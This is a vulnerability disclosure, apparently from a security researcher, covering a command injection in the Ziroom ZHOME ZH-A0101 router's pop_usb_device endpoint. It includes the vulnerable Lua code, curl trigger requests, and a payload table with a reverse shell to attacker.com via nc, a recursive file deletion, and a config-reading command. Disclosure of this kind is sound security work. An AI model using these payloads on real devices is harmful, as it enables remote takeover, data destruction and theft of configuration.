# Command Injection Vulnerability in ZHOME ZH-A0101 pop_usb_device via `path`

## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Command Injection
- **Affected Endpoint:** `GET /api/ZRUsb/pop_usb_device?path=<PAYLOAD>`
- **Affected Parameter:** `path`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Severity:** Critical

## Vulnerability Information

| Item                | Detail                                         |
| ------------------- | ---------------------------------------------- |
| File                | `usr/lib/lua/luci/controller/api/zrUsb.lua`    |
| Function            | `pop_usb_device()`                             |
| Code Location       | line 178-210                                   |
| Injection Location  | line 185, line 188                             |
| Endpoint            | `GET /api/ZRUsb/pop_usb_device?path=<PAYLOAD>` |
| Injection Parameter | `path`                                         |
| Authentication      | HTTP Basic Auth (`root`)                       |

## Vulnerable Code
<img width="1794" height="1020" alt="image" src="https://github.com/user-attachments/assets/adbcd11d-87f3-457e-8a72-61c0eac1e6e1" />

```lua
-- zrUsb.lua line 178-189
function pop_usb_device()
    LuciHttp.prepare_content("application/json")
    local result = {code=0}
    local path = LuciHttp.formvalue("path")
    local cmd
    local state

    cmd = string.format("/bin/mount | grep -w " .. path)
    state = ZRQosFun.trim(LuciUtil.exec(cmd))

    if not ZRFun.isStrNil(state) then
        cmd = string.format("umount -l " .. path)
        state = ZRQosFun.trim(LuciUtil.exec(cmd))
    end
end
```

The `path` parameter is directly appended to shell commands. The first command is executed through `LuciUtil.exec()`, which internally invokes shell execution. Therefore, command separators in `path` are interpreted by `/bin/sh`.

## Exploit Chain

```text
Attacker
 |
 |-- Step 1: Obtain the root credential.
 |
 |-- Step 2: Send an authenticated GET or POST request.
 |           URL:
 |           http://192.168.18.1/cgi-bin/luci/;stok=<STOK>/api/ZRUsb/pop_usb_device
 |           Parameter:
 |           path=<PAYLOAD>
 |
 |-- Step 3: Inject through the path parameter.
 |           Normal value:
 |           path=/mnt/sda1
 |
 |           Normal command:
 |           /bin/mount | grep -w /mnt/sda1
 |
 |           Injected value:
 |           path=x;touch /tmp/vuln06.txt
 |
 |           Final command:
 |           /bin/mount | grep -w x;touch /tmp/vuln06.txt
 |
 `-- Step 4: /bin/sh executes the injected command.
             Command 1: /bin/mount | grep -w x
             Command 2: touch /tmp/vuln06.txt
```

## Trigger Request

### GET Method

```bash
curl -s --noproxy "*" -b cookies.txt \
  --data-urlencode "path=x;touch /tmp/vuln06.txt" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRUsb/pop_usb_device"
```

### POST Method

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode "path=x;touch /tmp/vuln06.txt" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRUsb/pop_usb_device"
```

## Verification

```bash
ssh -p 1022 root@192.168.18.1 "ls -la /tmp/vuln06.txt"
```
<img width="2055" height="240" alt="image" src="https://github.com/user-attachments/assets/9d986404-2dd2-475c-8ebb-055319dabc63" />



## Special Note

There are two independent command concatenation points in this function: line 185 and line 188. In the verified exploit path, the first command is enough to trigger command execution. If the first `grep` command does not match anything, `state` is empty and the second `umount` command may not be reached. This does not prevent exploitation because the injected command in the first execution path has already run.

## Exploitation Scenarios

| Scenario      | Payload                                     | Description                  |
| ------------- | ------------------------------------------- | ---------------------------- |
| Create file   | `path=x;touch /tmp/test`                    | Verify command execution     |
| Reverse shell | `path=x;nc attacker.com 4444 -e /bin/sh`    | Requires `nc` on the device  |
| Delete files  | `path=x;rm -rf /zihome/plugins`             | Damage the IoT plugin system |
| Read config   | `path=x;cat /etc/config/*>/tmp/configs.txt` | Collect configuration data   |


